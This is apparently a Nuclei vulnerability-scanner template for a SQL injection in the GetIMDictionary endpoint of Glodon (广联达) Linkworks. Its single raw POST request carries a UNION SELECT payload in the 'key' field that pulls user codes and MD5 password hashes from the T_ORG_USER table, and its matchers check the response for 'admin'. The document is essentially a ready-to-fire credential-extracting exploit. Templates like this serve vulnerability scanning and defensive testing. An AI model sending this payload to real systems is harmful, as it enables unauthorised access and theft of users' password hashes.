id: gld-linkworks-getimdictionary-sql-injection
info:
  name: "广联达 Linkworks GetIMDictionary SQL注入漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    SQL Injection vulnerability in 广联达 Linkworks GetIMDictionary
http:
  - raw:
      - |
        POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        key=1' UnION ALL SElECT top 1 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "admin"
          - "></result>"
          - "value"
        part: body
